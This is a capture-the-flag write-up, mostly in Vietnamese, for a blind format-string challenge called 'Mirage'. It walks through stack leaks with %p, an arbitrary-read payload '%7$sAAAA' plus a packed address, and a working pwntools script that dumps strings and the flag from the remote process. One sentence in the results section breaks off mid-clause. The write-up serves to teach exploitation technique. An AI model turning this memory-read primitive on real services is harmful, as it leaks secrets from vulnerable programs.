---
title: "Mirage"
category: "Pwn"
tags: ["format-string", "arbitrary-read"]
solve_date: "2026-10-11T09:12:00+07:00"
language: "vi"
---

# Mirage

**Flag:** `isfcr{bl1nd_f0rmat_str1ng_h4s_n0_b1n4ry}`
**Dịch vụ:** remote service `nc 0.cloud.chals.io 23023` (no binary provided)

| Item | Value |
|---|---|
| Category | Pwn - blind format string |
| Interaction | Line-based echo prompt `> ` |
| Flag format | `isfcr{...}` |

## Đề bài

Dịch vụ echo chỉ cung cấp kết nối mạng, không có binary. Mục tiêu là đọc flag từ bộ nhớ process qua format string.

## Phân tích

Input `hello` được echo, còn `%p` làm lộ stack value. Marker `MARKER.%` xuất hiện ở argument 6 dưới dạng little-endian `0x252e52454b52414d`. Có thể dùng phần đầu buffer làm format string và đặt pointer ở qword tiếp theo.

```
MARKER.%p.%p....(%20)
0x48725b.(nil).0x71.(nil).(nil).0x252e52454b52414d.0x2e70252e70252e70....
```

## Các hướng đã kiểm tra

Duyệt rodata chỉ tìm được chuỗi glibc, banner, `quit` và `flag.txt`, không có flag. Duyệt trực tiếp slot thấp bằng `%N$s` cũng không có pointer tới flag. Cần arbitrary read thay vì chỉ dò argument slot.

## Lời giải

1. Dùng `%7$sAAAA` dài đúng 8 byte rồi nối `p64(addr)`. Pointer nằm ở slot 7; các byte NUL trong địa chỉ ở sau format string nên không cắt format trước khi `%7$s` được xử lý.
2. Các địa chỉ thấp `0x48725b` và `0x489448` trả `quit` và banner ổn định qua các kết nối đã kiểm tra. Điều này cho phép dùng địa chỉ image cố định trong instance quan sát; không áp dụng cho stack đã ASLR.
3. Chuỗi `flag.txt` cho biết chương trình đọc flag lúc chạy. Thu pointer từ stack rồi dereference bằng primitive vừa dựng.
4. Địa chỉ `0x4b6ac0` trả flag trong vùng dữ liệu writable. Đọc lại ở kết nối khác thu cùng chuỗi.

   ```python
   payload = b'%7$sAAAA' + p64(addr)   # "%7$s" derefs the address we just parked on the stack
   ```

   ```
   0x4b6ac0: b'isfcr{bl1nd_f0rmat_str1ng_h4s_n0_b1n4ry}'
   ```

## Kết quả

Flag được đọc trực tiếp từ process memory và kiểm tra lại qua kết nối khác.

`isfcr{bl1nd_f0rmat_str1ng_h4s_n0_b1n4ry}`

`isfcr{...}` wrapper matches the announced format. It was not submitted to the scoring service, so

## Tái hiện

Cần Python 3 và pwntools. Code dưới đây đọc buffer ở địa chỉ đã quan sát. Nếu cần xác định lại địa chỉ, kiểm tra `quit`/banner qua các lần reconnect, đọc rodata để tìm `flag.txt`, rồi dereference các pointer đã leak. Luôn đặt raw address sau format string.

```python
from pwn import *

HOST, PORT = '0.cloud.chals.io', 23023

def conn():
    r = remote(HOST, PORT, level='warn')
    r.recv(timeout=3)          # initial "> " prompt
    return r

def read_str(addr):
    r = conn()
    # "%7$s" + 4 filler bytes = 8 bytes, so the parked 8-byte address lands on slot 7
    r.sendline(b'%7$sAAAA' + p64(addr))
    resp = r.recv(timeout=2)
    r.close()
    return resp.split(b'AAAA')[0]

print(read_str(0x48725b))      # b'quit'                 -> technique sanity check
print(read_str(0x489448))      # b'[chall] mirage on 127.0.0.1:%d' -> non-PIE banner
print(read_str(0x4b6ac0))      # b'isfcr{...}'           -> flag in .bss
```

```text
b'quit'
b'[chall] mirage on 127.0.0.1:%d'
b'isfcr{bl1nd_f0rmat_str1ng_h4s_n0_b1n4ry}'
```
